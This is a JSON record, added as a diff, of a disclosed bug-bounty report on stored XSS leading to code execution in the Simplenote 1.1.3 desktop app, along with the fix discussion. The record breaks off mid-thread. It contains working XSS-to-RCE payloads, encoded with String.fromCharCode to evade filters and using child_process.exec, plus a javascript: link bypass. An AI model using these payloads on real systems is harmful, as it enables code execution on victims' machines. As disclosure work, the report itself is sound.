@@ -1,0 +1,590 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-06-26T08:26:03.226Z", 
+    "voters": [
+        "muon4", 
+        "eveeez", 
+        "geeknik", 
+        "zdkano", 
+        "ahiezer", 
+        "an0nym0us", 
+        "cache_bounty", 
+        "babayaga_", 
+        "superman85", 
+        "apapedulimu", 
+        "and 11 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "250.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 358049, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "In **Simplenote 1.1.3 - Desktop app** there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.\n\nThis report is based on the [report **#291539**](https://hackerone.com/reports/291539), by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.\n\n# Step to reproduce\n\n## 1 - Prerequisites\n\n- Download and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)\n- Markdown must **not** be enabled\n\n## 2 - Stored XSS\n\nCreate a new note, and you write this text:\n```\n\">'><details/open/ontoggle=confirm('XSS')>\n```\nNow go to **File** --> **Print**. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.\n\n## 3 - From XSS to RCE\n\nThanks to [**ysx**] (https://hackerone.com/ysx), I used the code in his proof-of-concept.\nThe code to open the Gnome calculator in Debian is:\n\n```\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n```\n\nNow you use the functions `writeln()` and `String.fromCharCode()` to bypass possible filters. So you [encode] (https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder) the script into unicode values. Now you can create the payload:\n\n```\n\">'><img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>\n```\n\nYou write it in a note, then you print it (or save like pdf). The Gnome calculator will open.\n\nI have attached two screenshots and a proof-of-concept video.\n\n## Impact\n\nAn attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim's computer.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "RCE via Print function [Simplenote 1.1.3 - Desktop app] ", 
+    "is_member_of_team?": null, 
+    "vote_count": 21, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-07-26T08:26:03.366Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$250", 
+    "attachments": [
+        {
+            "file_name": "simplenote_rce_screen.png", 
+            "type": "image/png", 
+            "id": 302301, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/302/301/bf86f47e8f3e6b6bdab6fd0ee2e35dba0d8ed32c/simplenote_rce_screen.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221846Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=76e88fe11e19ccdd01bcbe6630af748aab47cc411f6335c12974db960a7db49f"
+        }, 
+        {
+            "file_name": "simplenote_rce_poc.mp4", 
+            "type": "video/mp4", 
+            "id": 302302, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/302/302/2c46c8d847b2d0372cd7cdbf672722b2ac042502/simplenote_rce_poc.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221846Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a3d507fefa1d178e0c7633e46e1b7cd02a58c9e8aa60453823a2216122320bb8"
+        }, 
+        {
+            "file_name": "simplenote_rce_screen2.png", 
+            "type": "image/png", 
+            "id": 302303, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/302/303/499be97b185aca85e2a88a6310183a460cbe7c0f/simplenote_rce_screen2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221846Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4bf2e9778915f8d5b18203cbfb08c9214dbf8520f1999fd0aa51dd9a156d86b0"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-27T09:33:56.733Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-27T09:33:56.733Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High", 
+                "old_severity": null
+            }, 
+            "team_handle": "automattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2803154, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-27T10:57:47.869Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-27T10:57:47.869Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "It is possible to use a shorter payload:\n`<script>require('child_process').exec('/usr/bin/gnome-calculator',function(){})</script>`\n\nThen you use `writeln()` and `String.FromCharcode()`. The final payload is:\n`\">'><details/open/ontoggle=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,102,117,110,99,116,105,111,110,40,41,123,125,41,60,47,115,99,114,105,112,116,62))>`", 
+            "markdown_message": "<p>It is possible to use a shorter payload:<br>\n<code>&lt;script&gt;require(&#39;child_process&#39;).exec(&#39;/usr/bin/gnome-calculator&#39;,function(){})&lt;/script&gt;</code></p>\n\n<p>Then you use <code>writeln()</code> and <code>String.FromCharcode()</code>. The final payload is:<br>\n<code>&quot;&gt;&#39;&gt;&lt;details/open/ontoggle=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,102,117,110,99,116,105,111,110,40,41,123,125,41,60,47,115,99,114,105,112,116,62))&gt;</code></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2803207, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T15:57:08.664Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T15:57:08.664Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Thanks for the report @luigigubello! I remember noticing this a little while ago, but looks like a follow-up PR didn't happen to actually fix it. This report is a great reminder to get it fixed asap!\n\nhttps://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892", 
+            "markdown_message": "<p>Thanks for the report <a href=\"/luigigubello\">@luigigubello</a>! I remember noticing this a little while ago, but looks like a follow-up PR didn&#39;t happen to actually fix it. This report is a great reminder to get it fixed asap!</p>\n\n<p><a title=\"https://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892\" href=\"/redirect?signature=22bab463d0d7e74d4381f4501fdd9a425890bb2f&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fpull%2F724%23discussion_r174950892\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2806324, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T16:07:19.854Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T16:07:19.854Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi @roundhill \nI think you should fix. I did not know the topic on Github, but this vulnerability is an RCE. I hope you will fix this bug soon :) do you want to triage this report?", 
+            "markdown_message": "<p>Hi <a href=\"/roundhill\">@roundhill</a> <br>\nI think you should fix. I did not know the topic on Github, but this vulnerability is an RCE. I hope you will fix this bug soon :) do you want to triage this report?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2806357, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T16:16:38.196Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T16:16:38.196Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Yes, working on it now. Thanks again.", 
+            "markdown_message": "<p>Yes, working on it now. Thanks again.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2806364, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T16:19:24.848Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T16:19:24.848Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Good work :)\n\nBest  regards", 
+            "markdown_message": "<p>Good work :)</p>\n\n<p>Best  regards</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2806370, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-05T15:26:25.687Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-05T15:26:25.687Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi :)\n\nAny news about the fix?", 
+            "markdown_message": "<p>Hi :)</p>\n\n<p>Any news about the fix?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2844796, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-14T16:10:52.066Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-14T16:10:52.066Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi @luigigubello, the 1.1.4 update contains the fix for this issue. Can you please confirm?\n\nDetails here: https://github.com/Automattic/simplenote-electron/pull/766", 
+            "markdown_message": "<p>Hi <a href=\"/luigigubello\">@luigigubello</a>, the 1.1.4 update contains the fix for this issue. Can you please confirm?</p>\n\n<p>Details here: <a title=\"https://github.com/Automattic/simplenote-electron/pull/766\" href=\"/redirect?signature=c9238e8901047f0f7f6da483f25d508a6d3fcfca&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fpull%2F766\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Automattic/simplenote-electron/pull/766</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2884111, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-14T16:11:08.070Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-14T16:11:08.070Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 2884112, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/309/009/ac199962f8b5f5045a368af1ef7e4712e2f7e2e1/simplenote_rce_2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221846Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e74753692f81967a5bdcbd9b8f6d50133cb5cb0111154cc8253d135762a809a9", 
+                    "type": "video/mp4", 
+                    "id": 309009, 
+                    "filename": "simplenote_rce_2.mp4"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-06-14T20:41:36.535Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-14T20:56:06.628Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi @roundhill ,\n\nThe fix in Simplenote **1.1.4** is good, but there is still a little bug that allows to execute code. I have attached a proof-of-concept video. \n\n### Step to reproduce\n\n* You paste this code in Simplenote 1.1.4 with **enabled** Markdown\n\n```\n<a href=\"javascript:require('child_process').exec('/usr/bin/gnome-calculator',function(){});\">CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME </a>\n```\n* Now you **enable** the Preview\n* Go to Print and, when the window to print appears, you click on *CLICK ME*\n* Gnome Calculator runs\n\nSo, maybe you want to fix this little bug too. However, it is difficult to make a RCE in this way.\n\n\n", 
+            "markdown_message": "<p>Hi <a href=\"/roundhill\">@roundhill</a> ,</p>\n\n<p>The fix in Simplenote <strong>1.1.4</strong> is good, but there is still a little bug that allows to execute code. I have attached a proof-of-concept video. </p>\n\n<h3 id=\"step-to-reproduce\">Step to reproduce</h3>\n\n<ul>\n<li>You paste this code in Simplenote 1.1.4 with <strong>enabled</strong> Markdown</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>&lt;a href=&quot;javascript:require(&#39;child_process&#39;).exec(&#39;/usr/bin/gnome-calculator&#39;,function(){});&quot;&gt;CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME &lt;/a&gt;\n</code></pre>\n<ul>\n<li>Now you <strong>enable</strong> the Preview</li>\n<li>Go to Print and, when the window to print appears, you click on <em>CLICK ME</em>\n</li>\n<li>Gnome Calculator runs</li>\n</ul>\n\n<p>So, maybe you want to fix this little bug too. However, it is difficult to make a RCE in this way.</p>\n", 
+            "type": "Activities::BugNew", 
+            "id": 2886149, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-15T01:31:54.410Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-15T01:31:54.410Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
